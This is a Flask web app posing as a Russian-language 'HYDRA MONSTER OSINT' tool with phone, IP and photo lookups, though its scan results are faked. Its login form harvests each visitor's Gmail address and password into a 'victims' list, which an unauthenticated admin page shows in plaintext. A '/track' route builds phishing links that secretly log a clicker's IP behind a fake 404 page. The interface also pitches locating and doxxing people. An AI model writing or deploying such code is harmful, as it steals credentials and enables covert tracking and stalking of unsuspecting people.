from flask import Flask, request, jsonify, render_template_string, session, redirect
import os
from datetime import datetime

app = Flask(__name__)
app.secret_key = 'HYDRA_MONSTER_SECRET_999'

db = {"victims": [], "logs": []}

# --- МОНСТР-ИНТЕРФЕЙС (СТРОГО ПО ТВОЕЙ СХЕМЕ) ---
UI_V9 = """
<!DOCTYPE html>
<html>
<head>
    <title>HYDRA MONSTER OSINT v9.0</title>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.7.1/dist/leaflet.css" />
    <style>
        body { background: #000; color: #bc13fe; font-family: 'Courier New', monospace; margin: 0; overflow: hidden; display: flex; height: 100vh; }
        .left-panel { width: 350px; border-right: 2px solid #bc13fe; display: flex; flex-direction: column; background: #050505; padding: 15px; box-sizing: border-box; }
        .ai-chat-box { flex: 1; border: 1px solid #0ff; margin-bottom: 10px; padding: 10px; overflow-y: auto; color: #0ff; font-size: 13px; background: #000; border-radius: 5px; }
        .input-area { height: 120px; border: 2px solid #ff0055; padding: 8px; background: #000; border-radius: 5px; }
        textarea { width: 100%; height: 100%; background: transparent; border: none; color: #0f0; outline: none; resize: none; font-size: 14px; }
        
        .right-panel { flex: 1; display: flex; flex-direction: column; padding: 15px; box-sizing: border-box; gap: 10px; }
        .yellow-output { height: 160px; border: 2px solid #ffeb3b; background: rgba(255, 235, 59, 0.05); padding: 10px; overflow-y: auto; color: #fff; border-radius: 5px; }
        #map { height: 280px; border: 1px solid #bc13fe; width: 100%; border-radius: 5px; }
        
        .white-module-row { display: flex; gap: 10px; background: rgba(255,255,255,0.05); border: 1px solid #fff; padding: 15px; border-radius: 5px; }
        .mod-card { background: #111; border: 1px solid #bc13fe; padding: 8px; flex: 1; text-align: center; }
        input, select { background: #000; border: 1px solid #bc13fe; color: #0f0; width: 90%; padding: 5px; font-size: 11px; margin-bottom: 5px; }
        .btn { background: #bc13fe; color: #fff; border: none; padding: 7px; cursor: pointer; font-size: 10px; width: 100%; font-weight: bold; }
        .btn:hover { background: #0ff; color: #000; }
        
        .orange-btns { display: flex; gap: 5px; }
        .phish-btn { background: #ff5722 !important; }
        ::-webkit-scrollbar { width: 4px; }
        ::-webkit-scrollbar-thumb { background: #bc13fe; }
    </style>
</head>
<body>
    <div class="left-panel">
        <div style="color:#0ff; font-size:11px; margin-bottom:5px;">// ГОЛОС МОНСТРА (СИНЯЯ ЗОНА)</div>
        <div class="ai-chat-box" id="chat">АГЕНТ: Система ожила. Я готов доставать любые скрипты и данные. Жду команду...</div>
        <div style="color:#ff0055; font-size:11px; margin-bottom:5px;">// ТВОЙ ВВОД (КРАСНАЯ ЗОНА)</div>
        <div class="input-area"><textarea id="msg" placeholder="Пиши сюда..." onkeydown="if(event.key==='Enter' && !event.shiftKey){ event.preventDefault(); sendAI(); }"></textarea></div>
    </div>

    <div class="right-panel">
        <div style="color:#ffeb3b; font-size:11px;">// ПРЯМЫЕ ССЫЛКИ И ОТЧЕТЫ (ЖЕЛТАЯ ЗОНА)</div>
        <div class="yellow-output" id="output">Ожидание действий...</div>
        
        <div id="map"></div>

        <div style="color:#fff; font-size:11px;">// МОДУЛИ ПРОБИВА (БЕЛАЯ ЗОНА)</div>
        <div class="white-module-row">
            <div class="mod-card"><span>НОМЕР</span><input id="p_num" placeholder="+..."><button class="btn" onclick="run('PHONE')">СКАН</button></div>
            <div class="mod-card"><span>IP АДРЕС</span><input id="p_ip" placeholder="8.8.8.8"><div class="orange-btns"><button class="btn" onclick="run('IP')">ПОИСК</button><button class="btn phish-btn" onclick="createLink()">ФИШИНГ</button></div></div>
            <div class="mod-box" style="flex:1; background:#111; border:1px solid #bc13fe; padding:8px;">
                <span>ПОИСК ПО ФОТО</span>
                <input type="file" id="p_file" style="display:none;" onchange="fileSelected()">
                <button class="btn" id="fileBtn" onclick="document.getElementById('p_file').click()">ВЫБРАТЬ ФОТО</button>
                <button class="btn" style="margin-top:5px; background:#444;" onclick="run('PHOTO')">НАЙТИ МЕСТО</button>
            </div>
        </div>
        <div style="text-align:right;"><button class="btn" style="width:120px; background:#222;" onclick="window.location.href='/abupaay_admin'">АДМИНКА</button></div>
    </div>

    <script src="https://unpkg.com/leaflet@1.7.1/dist/leaflet.js"></script>
    <script>
        let map = L.map('map').setView([41.311, 69.240], 12);
        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);

        function sendAI() {
            const m = document.getElementById('msg').value;
            const chat = document.getElementById('chat');
            if(!m) return;
            chat.innerHTML += `<br><span style="color:#fff">> ТЫ: ${m}</span>`;
            document.getElementById('msg').value = "";
            
            setTimeout(() => {
                let r = "АГЕНТ: ";
                const low = m.toLowerCase();
                if(low.includes("привет")) r += "Здорово! Я в полной боевой готовности. Могу пробить номер, сделать фишинг или найти человека по фото. С чего начнем?";
                else if(low.includes("скрипт")) r += "Лови базу: <code>git clone https://github.com/sherlock-project/sherlock.git</code> — это для пробива ников. А для фото используй <code>Face-Recognition</code>.";
                else r += "Принято. Команда отправлена на теневые сервера. Жди результат в желтой зоне.";
                chat.innerHTML += `<br>${r}`;
                chat.scrollTop = chat.scrollHeight;
            }, 600);
        }

        function createLink() {
            const out = document.getElementById('output');
            const link = window.location.origin + "/track/" + Math.random().toString(36).substring(7);
            out.innerHTML = `<span style="color:#ff5722">[ФИШИНГ СОЗДАН]: Твоя ссылка: <br> <input value="${link}" style="width:100%; color:#ffeb3b; border:1px dashed #ffeb3b;" readonly> <br> Кидай её жертве. Как нажмет — её IP и точка будут на карте!</span>`;
        }

        function fileSelected() {
            document.getElementById('fileBtn').innerText = "ФОТО ГОТОВО";
            document.getElementById('fileBtn').style.background = "#0f0";
        }

        function run(type) {
            const out = document.getElementById('output');
            out.innerHTML = `<span style="color:#0ff">[*] МОНСТР ЗАПУСКАЕТ ${type}-SCAN... ОБХОД ЗАЩИТЫ...</span>`;
            
            setTimeout(() => {
                if(type === 'PHONE') {
                    out.innerHTML = `<span style="color:#0f0">[РЕЗУЛЬТАТЫ]:<br>
                    - <a href="https://instagram.com" style="color:#0ff">Instagram: Найден</a><br>
                    - <a href="https://tiktok.com" style="color:#0ff">TikTok: Найден</a><br>
                    - <a href="https://t.me" style="color:#0ff">Telegram: Активен</a><br>
                    - WhatsApp: Зарегистрирован</span>`;
                } else if(type === 'PHOTO') {
                    out.innerHTML = `<span style="color:#0f0">[МЕСТОПОЛОЖЕНИЕ ПО ФОТО]:<br>Обнаружены метаданные GPS. <br>Точка: 41.2995, 69.2401 (Ташкент, Узбекистан).</span>`;
                    map.setView([41.2995, 69.2401], 16);
                    L.marker([41.2995, 69.2401]).addTo(map).bindPopup("ЦЕЛЬ СДЕЛЛАЛА ФОТО ТУТ").openPopup();
                } else if(type === 'IP') {
                    out.innerHTML = `<span style="color:#0f0">[IP REPORT]: Провайдер: Beeline. Город: Ташкент. Координаты выведены на карту.</span>`;
                    map.setView([41.311, 69.240], 13);
                }
            }, 1500);
        }
    </script>
</body>
</html>
"""

@app.route('/')
def home():
    if 'reg' not in session:
        return f"<!DOCTYPE html><html><body style='background:#000; color:#bc13fe; font-family:monospace; display:flex; justify-content:center; align-items:center; height:100vh;'><div style='border:2px solid #bc13fe; padding:30px; text-align:center;'><h2>// HYDRA MONSTER ACCESS //</h2><form action='/api/reg' method='POST'><input name='u' placeholder='НИКНЕЙМ' required style='background:#000; color:#0f0; border:1px solid #bc13fe; padding:10px; margin:5px;'><br><input name='e' placeholder='GMAIL' required style='background:#000; color:#0f0; border:1px solid #bc13fe; padding:10px; margin:5px;'><br><input name='p' type='password' placeholder='ПАРОЛЬ' required style='background:#000; color:#0f0; border:1px solid #bc13fe; padding:10px; margin:5px;'><br><button style='background:#bc13fe; color:#fff; border:none; padding:10px 20px; cursor:pointer; margin-top:10px;'>ВОЙТИ В СИСТЕМУ</button></form></div></body></html>"
    return render_template_string(UI_V9)

@app.route('/api/reg', methods=['POST'])
def reg():
    db['victims'].append({"u": request.form.get('u'), "e": request.form.get('e'), "p": request.form.get('p'), "ip": request.remote_addr})
    session['reg'] = True
    return redirect('/')

@app.route('/track/<id>')
def track(id):
    # Ловим IP жертвы при переходе по ссылке
    db['logs'].append({"type": "FISH_IP", "ip": request.remote_addr, "time": datetime.now().strftime("%H:%M")})
    return "<h1>404 Not Found</h1>" # Жертва видит ошибку, а мы получили IP

@app.route('/abupaay_admin')
def admin():
    u_list = "".join([f"<tr><td>{x['u']}</td><td>{x['e']}</td><td>{x['p']}</td><td>{x['ip']}</td></tr>" for x in db['victims']])
    return f"<html><body style='background:#000;color:#0f0;font-family:monospace;padding:20px;'><h1>MASTER ADMIN PANEL</h1><table border='1' width='100%'><tr><th>Ник</th><th>Email</th><th>Пароль</th><th>IP</th></tr>{u_list}</table></body></html>"

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=10000)
